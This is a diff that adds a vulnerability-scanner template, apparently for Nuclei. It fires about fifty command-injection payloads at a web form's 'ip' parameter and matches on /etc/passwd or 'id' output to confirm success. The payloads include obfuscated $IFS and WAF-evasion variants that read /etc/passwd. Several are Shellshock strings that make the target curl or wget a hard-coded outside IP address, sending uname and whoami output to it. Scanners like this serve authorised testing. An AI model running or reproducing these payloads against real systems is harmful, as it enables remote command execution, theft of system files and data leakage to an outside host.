@@ -1,0 +1,95 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "|cat%24IFS%2Fetc%2Fpasswd"
+        - "%22%20id"
+        - "|cat%24IFS%2Fetc%2Fpasswd"
+        - "`cat /etc/passwd`"
+        - "%60id%60"
+        - "%29%24u%7Bhahaha%7Dtc%2B%2Fet%24u%7Bheywaf%7Dc%2Fpas%24u%7Bcatchthis%7Dswd%7D"
+        - "%5Cid%7C"
+        - "%26%26cat%24IFS%2Fetc%2Fpasswd"
+        - "%60id%60"
+        - "<id"
+        - "%60id%60"
+        - ";id\\n"
+        - "%27%20id"
+        - "%2Fid%0A"
+        - "%26cat%2520%2Fetc%2Fpasswd"
+        - "%5Eid"
+        - "%60cat%24u%20%2Fetc%24u%2Fpasswd%24u%60"
+        - "&&id"
+        - ";cat%20/etc/passwd"
+        - "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=20?uname=\\`uname -a\\`\""
+        - "%29%3Bid"
+        - "cat%20/etc/passwd"
+        - "& id &"
+        - "cat%24IFS%2Fetc%2Fpasswd"
+        - "a);cat+/etc/passwd+#"
+        - "%26cat%20/etc/passwd"
+        - "|id"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?user=\\`whoami\\`\""
+        - "cat /etc/passwd"
+        - "&&cat$IFS/etc/passwd"
+        - "cat /etc/passwd"
+        - "%2Cid"
+        - "cat%20/etc/passwd"
+        - "i`u\"d"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=21?uname=\\`uname -a\\`\""
+        - "&&echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd"
+        - "cat%20/etc/passwd"
+        - "%60id%60%26"
+        - "id|whoami;"
+        - "|/usr/bin/id"
+        - "&cat%20/etc/passwd"
+        - "| id"
+        - "%22%20%60id%60"
+        - "%22cat%20/etc/passwd"
+        - "|/usr/bin/id"
+        - "1;uname${IFS}-a;#${IFS}';"
+        - "& id"
+        - "%60cat%2520%2Fetc%2Fpasswd%60"
+        - "() { :;}; /bin/bash -c \"sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=2&?vuln=6\""
+        - "%29id"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
